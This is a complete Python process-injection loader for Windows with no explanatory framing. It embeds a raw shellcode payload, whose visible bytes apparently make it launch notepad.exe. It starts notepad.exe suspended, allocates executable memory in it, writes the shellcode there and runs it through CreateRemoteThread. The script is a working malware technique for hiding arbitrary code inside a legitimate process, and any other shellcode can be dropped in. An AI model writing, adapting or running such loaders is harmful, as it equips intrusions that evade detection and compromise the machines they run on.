import ctypes
import ctypes.wintypes as wintypes

#shellcode of payload
shellcode = (
    b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
    b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
    b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
    b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
    b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
    b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
    b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
    b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
    b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
    b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
    b"\x00\x53\xff\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e"
    b"\x65\x78\x65\x00"
 )

#Defining structures for CreateProcessW()
class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPWSTR),
        ("lpDesktop", wintypes.LPWSTR),
        ("lpTitle", wintypes.LPWSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

#Create Suspended Process
si = STARTUPINFO()
pi = PROCESS_INFORMATION()
si.cb = ctypes.sizeof(STARTUPINFO)

ctypes.windll.kernel32.CreateProcessW(
    None,
    "C:\\Windows\\System32\\notepad.exe",  # Legit target process
    None,
    None,
    False,
    0x4,  # CREATE_SUSPENDED
    None,
    None,
    ctypes.byref(si),
    ctypes.byref(pi)
)

# --- Allocate memory in remote process ---
address = ctypes.windll.kernel32.VirtualAllocEx(
    pi.hProcess,
    None,
    len(shellcode),
    0x3000,  # MEM_COMMIT | MEM_RESERVE
    0x40     # PAGE_EXECUTE_READWRITE            Z
)

# --- Write shellcode ---
written = ctypes.c_size_t(0)
ctypes.windll.kernel32.WriteProcessMemory(
    pi.hProcess,
    address,
    shellcode,
    len(shellcode),
    ctypes.byref(written)
)

# --- Run shellcode ---
ctypes.windll.kernel32.CreateRemoteThread(
    pi.hProcess,
    None,
    0,
    address,
    None,
    0,
    None
)

# --- Resume the main thread ---
ctypes.windll.kernel32.ResumeThread(pi.hThread)
